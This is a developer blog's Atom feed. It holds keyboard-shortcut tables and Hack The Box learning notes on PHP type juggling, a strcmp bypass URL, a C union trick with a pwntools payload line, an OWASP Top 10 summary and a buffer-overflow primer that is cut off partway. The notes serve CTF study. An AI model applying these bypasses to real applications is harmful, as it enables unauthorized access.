<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-09-06T09:31:41-05:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Chrome shortcuts</title><link href="https://www.agalera.eu/chrome-shortcuts/" rel="alternate" type="text/html" title="Chrome shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/chrome-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/chrome-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>

<p>This page stores the ones I’m learning for Chrome browser</p>
<p><!--more--></p>

<table>
  <thead>
    <tr>
      <th>Shortcut</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>New tab</td>
      <td>CMD + t</td>
    </tr>
    <tr>
      <td>Next tab</td>
      <td>option + CMD + Arrow right/left</td>
    </tr>
    <tr>
      <td>Go to tab 1</td>
      <td>CMD + 1</td>
    </tr>
    <tr>
      <td>Go to tab 2</td>
      <td>CMD + 2</td>
    </tr>
  </tbody>
</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="chrome" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful chrome shortcuts]]></summary></entry><entry><title type="html">Mac OS shortcuts</title><link href="https://www.agalera.eu/mac-shortcuts/" rel="alternate" type="text/html" title="Mac OS shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/mac-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/mac-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>

<p>This page stores the ones I’m learning for Mac OS.</p>
<p><!--more--></p>

<table>
  <thead>
    <tr>
      <th>Shortcut</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Current application to fullscreen</td>
      <td>control +  CMD + F</td>
    </tr>
    <tr>
      <td>Move between fullscreen apps</td>
      <td>control + Arrow right/left</td>
    </tr>
    <tr>
      <td>Finder go to folder</td>
      <td>CMD + Shift + G</td>
    </tr>
    <tr>
      <td>Finder see hidden files</td>
      <td>CMD + Shift + .</td>
    </tr>
    <tr>
      <td>Finder copy and paste</td>
      <td>CMD + C + CMD + V</td>
    </tr>
    <tr>
      <td>Finder copy and move</td>
      <td>CMD + C + CMD + option + V</td>
    </tr>
  </tbody>
</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="mac" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful Mac OS shortcuts]]></summary></entry><entry><title type="html">vscode shortcuts</title><link href="https://www.agalera.eu/vscode-shortcuts/" rel="alternate" type="text/html" title="vscode shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/vscode-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/vscode-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>

<p>This page stores the ones I’m learning for vscode.</p>
<p><!--more--></p>

<table>
  <thead>
    <tr>
      <th>Shortcut</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Go to file</td>
      <td>CMD + P</td>
    </tr>
    <tr>
      <td>Go to terminal</td>
      <td>control + `</td>
    </tr>
    <tr>
      <td>Go to editor</td>
      <td>control + 1,2,3,..</td>
    </tr>
    <tr>
      <td>Search</td>
      <td>CMD + F</td>
    </tr>
    <tr>
      <td>Search-replace</td>
      <td>option + CMD + F</td>
    </tr>
    <tr>
      <td>Fold</td>
      <td>CMD + K + 0</td>
    </tr>
    <tr>
      <td>Unfold</td>
      <td>CMD + K + J</td>
    </tr>
    <tr>
      <td>See all shortcuts</td>
      <td>CMD + K + S</td>
    </tr>
    <tr>
      <td>Go to explorer</td>
      <td>CMD + shift + e</td>
    </tr>
    <tr>
      <td>Multi-cursor search</td>
      <td>Select the term to search and CMD + shift + L</td>
    </tr>
  </tbody>
</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="vscode" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful vscode shortcuts]]></summary></entry><entry><title type="html">vim shortcuts</title><link href="https://www.agalera.eu/vim-shortcuts/" rel="alternate" type="text/html" title="vim shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/vim-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/vim-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>

<p>This page stores the ones I’m learning for vim.</p>
<p><!--more--></p>

<table>
  <thead>
    <tr>
      <th>Shortcut</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Duplicate line</td>
      <td>yy (yank line) , p (paste)</td>
    </tr>
    <tr>
      <td>Copy line to system</td>
      <td>shit + v (to select), yy (yank line)</td>
    </tr>
    <tr>
      <td>Add new line</td>
      <td>o</td>
    </tr>
    <tr>
      <td>Visual mode</td>
      <td>v</td>
    </tr>
    <tr>
      <td>Copy chars selected</td>
      <td>y (yank)</td>
    </tr>
    <tr>
      <td>Visual block mode</td>
      <td>ctrl + V</td>
    </tr>
  </tbody>
</table>

<h2 id="how-to">How to:</h2>

<h3 id="add-text-to-multiple-lines">Add text to multiple lines:</h3>

<ol>
  <li>Visual block mode</li>
  <li>Select where to change</li>
  <li>Press I</li>
  <li>Perform the change in one line</li>
  <li>Press ESC</li>
  <li>The change will propagate</li>
</ol>]]></content><author><name></name></author><category term="shortcuts" /><category term="vim" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful vim shortcuts]]></summary></entry><entry><title type="html">IntelliJ IDEA shortcuts</title><link href="https://www.agalera.eu/intellij-shortcuts/" rel="alternate" type="text/html" title="IntelliJ IDEA shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/intellij-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/intellij-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>

<p>This page stores the ones I’m learning for IntelliJ IDEA</p>
<p><!--more--></p>

<table>
  <thead>
    <tr>
      <th>Shortcut</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Move between open projects</td>
      <td>option + CMD + `</td>
    </tr>
    <tr>
      <td>Open terminal</td>
      <td>option + fn + F12</td>
    </tr>
    <tr>
      <td>Select</td>
      <td>option + Arrow Up/Down</td>
    </tr>
    <tr>
      <td>Move between words</td>
      <td>option + Arrow Left/Right</td>
    </tr>
    <tr>
      <td>Fold</td>
      <td>CMD (+) +</td>
    </tr>
    <tr>
      <td>Unfold</td>
      <td>CMD (+) -</td>
    </tr>
    <tr>
      <td>Search and replace</td>
      <td>CMD+R + option +A</td>
    </tr>
    <tr>
      <td>Project structure section</td>
      <td>CMD+1</td>
    </tr>
    <tr>
      <td>Run section</td>
      <td>CMD+4</td>
    </tr>
    <tr>
      <td>Move</td>
      <td>F6</td>
    </tr>
    <tr>
      <td>Go to line</td>
      <td>CMD+L</td>
    </tr>
    <tr>
      <td>See implementations</td>
      <td>option+CMD+B</td>
    </tr>
    <tr>
      <td>See usages</td>
      <td>CMD+B</td>
    </tr>
  </tbody>
</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="intellij-idea" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful Intellij IDEA shortcuts]]></summary></entry><entry><title type="html">Security and programming language</title><link href="https://www.agalera.eu/security-and-languages/" rel="alternate" type="text/html" title="Security and programming language" /><published>2023-01-24T00:00:00-06:00</published><updated>2023-01-24T00:00:00-06:00</updated><id>https://www.agalera.eu/security-and-languages</id><content type="html" xml:base="https://www.agalera.eu/security-and-languages/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the knowledge I’ve got regarding pentesting and certain programming languages.</p>

<p><!--more--></p>

<p>This article describe some features of programming languages that if used wrong, they can be attack vectors for applications. It’s not that the language is unsecure, but the features can be misused very easily.</p>

<h2 id="programming-languages">Programming languages</h2>
<ol>
  <li><a href="#php">PHP</a></li>
  <li><a href="#c">C</a></li>
</ol>

<h3 id="php-">PHP <a name="php"></a></h3>

<h4 id="type-juggling">Type juggling</h4>

<p>Due to the nature of PHP we can abuse the type jungling feature.</p>

<p>The following condition will be true and print the message.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$example_int</span> <span class="o">=</span> <span class="mi">7</span>
<span class="nv">$example_str</span> <span class="o">=</span> <span class="err">“</span><span class="mi">7</span><span class="err">”</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$example_int</span> <span class="o">==</span> <span class="nv">$example_str</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">echo</span><span class="p">(</span><span class="s2">"PHP can compare ints and strings."</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So, an if with <code class="language-plaintext highlighter-rouge">==</code> will not check the types. Only <code class="language-plaintext highlighter-rouge">===</code> check the types. Internally php select statement uses <code class="language-plaintext highlighter-rouge">==</code> comparisson, therefore is vulnerable to this kind of vulnerability. See <a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></p>

<p>So, if you spot a switch statement that checks a user provided string, just change the string value to <code class="language-plaintext highlighter-rouge">true</code>.</p>

<h4 id="strcmp">strcmp</h4>

<p>You can also check if the page is using php to abuse the <code class="language-plaintext highlighter-rouge">strcmp</code> function.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$PASSWORD</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Thanks to the type juggling describe above, if strcmp returns <code class="language-plaintext highlighter-rouge">NULL</code> the condition will be true. We can force this by passing the password field as an array:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22
</code></pre></div></div>

<p>Example: <a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</a></p>

<h3 id="c-">C <a name="c"></a></h3>

<h4 id="union">union</h4>

<p>A union type in C lang is a special type that allows the developer to reuse a memory position to store multiple types of data.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span> 
<span class="k">union</span> <span class="n">Data</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
   <span class="kt">float</span> <span class="n">f</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
<span class="p">};</span>
 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span> <span class="p">)</span> <span class="p">{</span>

   <span class="k">union</span> <span class="n">Data</span> <span class="n">data</span><span class="p">;</span>        

   <span class="n">data</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
   <span class="n">data</span><span class="p">.</span><span class="n">f</span> <span class="o">=</span> <span class="mi">220</span><span class="p">.</span><span class="mi">5</span><span class="p">;</span>
   <span class="n">strcpy</span><span class="p">(</span> <span class="n">data</span><span class="p">.</span><span class="n">str</span><span class="p">,</span> <span class="s">"C Programming"</span><span class="p">);</span>

   <span class="n">printf</span><span class="p">(</span> <span class="s">"data.i : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">i</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span> <span class="s">"data.f : %f</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">f</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span> <span class="s">"data.str : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">str</span><span class="p">);</span>

   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Outputs:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data.i : 1917853763
data.f : 4122360580327794860452759994368.000000
data.str : C Programming
</code></pre></div></div>

<p>If the developer rely on this union to hide a secret and let the user access to it, the user can change the value of the union by writing a different type that will be converted to the proper type when checking the secret.</p>

<p>Example:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">union</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">integer</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">string</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span> <span class="n">DataStore</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">get_flag</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">integer</span> <span class="o">==</span> <span class="mi">13371337</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sorry, this will not work!"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">set_field</span><span class="p">(</span><span class="n">field_t</span> <span class="n">f</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Maybe try a ritual?</span><span class="se">\n\n</span><span class="s">&gt;&gt; "</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">INTEGER</span><span class="p">:</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"%llu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DataStore</span><span class="p">.</span><span class="n">integer</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">integer</span> <span class="o">==</span> <span class="mi">13371337</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">What's this nonsense?!"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">STRING</span><span class="p">:</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">string</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">string</span><span class="p">));</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It turns out, the user can write to both fields in the union. However, if we set the magic number to get the secret, the app will exit. However, we can set in the string the byte value of the integer field:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">13371337</span><span class="p">))</span>
</code></pre></div></div>
<p>In the example we use python <code class="language-plaintext highlighter-rouge">pwntools</code> library to generate the byte value (in 64 bytes) of the magic number.</p>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="c" /><category term="php" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="c" /><category term="php" /><summary type="html"><![CDATA[I keep this page as a reference to the compile the knowledge I have got regarding security and some programming languages]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OWASP Top 10</title><link href="https://www.agalera.eu/owasp-top10/" rel="alternate" type="text/html" title="OWASP Top 10" /><published>2023-01-09T00:00:00-06:00</published><updated>2023-01-09T00:00:00-06:00</updated><id>https://www.agalera.eu/owasp-top10</id><content type="html" xml:base="https://www.agalera.eu/owasp-top10/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.</p>

<p><!--more--></p>

<h2 id="owasp-top-10">OWASP Top 10</h2>

<p>In <a href="https://owasp.org/Top10/">OWASP Top 10</a> website, you can see what are the most common vulnerabilities to exploit.</p>

<p>They are well categorized and they provide examples in website.</p>

<p>I’ll try to explain the groups sorted by order of occurrence in this article. This should be like a map to follow when pentesting things.</p>

<h3 id="broken-access-control">Broken Access Control</h3>

<p><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">https://owasp.org/Top10/A01_2021-Broken_Access_Control/</a></p>

<p>Malicious users can manipulate access control mechanisms.</p>

<p>Examples of this are:</p>

<ul>
  <li>Modify the loging cookie to change from regular user to admin user</li>
  <li>Manipulate JWT Tokens</li>
  <li>…</li>
</ul>

<h3 id="cryptographic-failures">Cryptographic Failures</h3>

<p><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">https://owasp.org/Top10/A02_2021-Cryptographic_Failures/</a></p>

<p>Examples of this are:</p>

<ul>
  <li>Using old ciphers in symmetric encryption</li>
  <li>Using short keys for RSA key: able to generate the private key from the public key</li>
  <li>Unsalted passwords</li>
  <li>…</li>
</ul>

<h3 id="injection">Injection</h3>

<p><a href="https://owasp.org/Top10/A03_2021-Injection/">https://owasp.org/Top10/A03_2021-Injection/</a></p>

<p>When the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.</p>

<p>Examples are:</p>
<ul>
  <li>SQL injections: break the SQL query syntax to execute arbitrary queries</li>
  <li>OS injections: being able to execute os commands via the user input</li>
  <li>Server-side template injection: abuse a template engine to inject any code</li>
  <li>…</li>
</ul>

<p>The injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.</p>

<p>If you don’t see the results back, you can try 2 things:</p>
<ul>
  <li>Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.</li>
  <li>Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the data</li>
  <li>Abuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.</li>
</ul>

<h3 id="insecure-design">Insecure Design</h3>

<p><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">https://owasp.org/Top10/A04_2021-Insecure_Design/</a></p>

<p>Examples of this are:</p>

<ul>
  <li>Bot detection mechanism</li>
  <li>Credentials hardcoded in the code</li>
  <li>…</li>
</ul>

<h3 id="security-misconfiguration">Security Misconfiguration</h3>

<p><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">https://owasp.org/Top10/A05_2021-Security_Misconfiguration/</a></p>

<p>This topic is very broad and might include things like:</p>

<ul>
  <li>Default users, passwords</li>
  <li>Unprotected paths of the application (remember nginx off-by-slash vulnerability)</li>
  <li>Stack traces revealing information to the user</li>
</ul>

<h3 id="vulnerable-and-outdated-components">Vulnerable and Outdated Components</h3>

<p><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</a></p>

<p>Using old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix</p>

<p>When you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it’s worth trying to replicate it in your setup.</p>

<h3 id="identification-and-authentication-failures">Identification and Authentication Failures</h3>

<p><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/</a></p>

<p>Examples:</p>

<ul>
  <li>Default/weak password</li>
  <li>Allowing brute force attacks to guess username/password</li>
</ul>

<h3 id="software-and-data-integrity-failures">Software and Data Integrity Failures</h3>

<p><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a></p>

<p>Application that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input. If the user can see and modified a serialized payload, that payload should be handled with extra care. Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.</p>

<h3 id="security-logging-and-monitoring-failures">Security Logging and Monitoring Failures</h3>

<p><a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/</a></p>

<p>Not enough monitoring for thins like an excessive number of failed login attemps, etc…</p>

<h3 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)</h3>

<p><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">https://owasp.org/Top10/A10<em>2021-Server-Side_Request_Forgery</em>%28SSRF%29/</a></p>

<p>This happens when an application fetches a resource from a third-pary from the input provided by a user. For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attack might include their own crafted version of the image that includes malicious code.</p>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="owasp" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="owasp" /><summary type="html"><![CDATA[I keep this page as a reference to the compile the knowledge I have got related with OWASP Top 10 vulnerabilities]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Reversing playbook</title><link href="https://www.agalera.eu/reversing-playbook/" rel="alternate" type="text/html" title="Reversing playbook" /><published>2023-01-04T00:00:00-06:00</published><updated>2023-01-04T00:00:00-06:00</updated><id>https://www.agalera.eu/reversing-playbook</id><content type="html" xml:base="https://www.agalera.eu/reversing-playbook/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.</p>

<p><!--more--></p>

<h2 id="table-of-contents">Table of contents</h2>
<ol>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#buffer-overflow">Buffer overflow</a></li>
  <li><a href="#obfuscated">Obfuscated code</a></li>
  <li><a href="#string-format">String format vulnerability</a></li>
  <li><a href="#flags">Security flags</a></li>
  <li><a href="#aslr">ASLR</a></li>
  <li><a href="#one-gadget">one gadget</a></li>
  <li><a href="#override-got">Overwrite Global Object Table</a></li>
</ol>

<h3 id="introduction-">Introduction <a name="introduction"></a></h3>

<p>There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).</p>

<p>The first step is to use regularly and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.</p>

<p>One useful tool to perform this kind of analysis is ghidra: <a href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a>.</p>

<p>For instance, you can search for references, memory addresses, search for strings, etc..</p>

<p>Another interesting tool is <code class="language-plaintext highlighter-rouge">gdb</code>, the gnu debugger. More on this to come, when i’m not familiar.</p>

<p>To debug Windows binaries, you can use <code class="language-plaintext highlighter-rouge">ollydbg</code>, analyse the code and place the breakpoints in the interesting addresses.</p>

<h3 id="buffer-overflow-">Buffer overflow <a name="buffer-overflow"></a></h3>

<p>In order to understand this attack, first we need to understand how the memory works in the computers.</p>

<p>We first need to understand that memory has the following regions:</p>

<table>
  <tbody>
    <tr>
      <td>Stack</td>
      <td>stores function local variables and information about function calls: return address, arguments, etc..</td>
    </tr>
    <tr>
      <td>Heap</td>
      <td>stores the dynamic memory. Used by malloc, etc…</td>
    </tr>
    <tr>
      <td>BSS</td>
      <td>stores the uninitialized static/global variables</td>
    </tr>
    <tr>
      <td>Data</td>
      <td>stores the static/global variables</td>
    </tr>
    <tr>
      <td>Text</td>
      <td>read only, stores the executable code</td>
    </tr>
  </tbody>
</table>

<p>Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:</p>

<table>
  <tbody>
    <tr>
      <td>Function arguments</td>
      <td> </td>
    </tr>
    <tr>
      <td>Return address</td>
      <td>where to go when the execution ends</td>
    </tr>
    <tr>
      <td>Previous frame pointer</td>
      <td>to know what is the stack frame of the function calling this function</td>
    </tr>
    <tr>
      <td>Local variables</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>Take this functions as example:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
  <span class="cm">/* The following statement will result in buffer overflow */</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">str</span> <span class="o">=</span> <span class="s">"This is definitely longer than 12"</span><span class="p">;</span>
  <span class="n">foo</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The stack frame for foo() will look like this:</p>

<table>
  <tbody>
    <tr>
      <td>arguments: str (pointer)</td>
    </tr>
    <tr>
      <td>Return address</td>
    </tr>
    <tr>
      <td>Previous Frame Pointer</td>
    </tr>
    <tr>
      <td>Local variables <br /><br />buffer[11]<br />…<br />buffer[1]</td>
    </tr>
  </tbody>
</table>

<p>In this case, we can keep adding data into the buffer until we reach the memory address of the return address. 
Then, we can tell the program to jump to any function that we want.</p>

<p>Knowing that, buffer overflow technique consists in three stages:</p>

<h3 id="overflow-the-stack-pointer">Overflow the stack pointer</h3>

<p>when a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: <code class="language-plaintext highlighter-rouge">gets</code> function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">char</span> <span class="n">local_bc</span> <span class="p">[</span><span class="mi">180</span><span class="p">];</span>
  
  <span class="n">gets</span><span class="p">(</span><span class="n">local_bc</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">local_bc</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.</p>

<h3 id="reach-to-the-return-address">Reach to the return address</h3>

<p>Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.</p>

<p>In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.</p>

<p>Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.</p>

<p>You can do it in a less manual way using <code class="language-plaintext highlighter-rouge">gdb-peda</code>:</p>

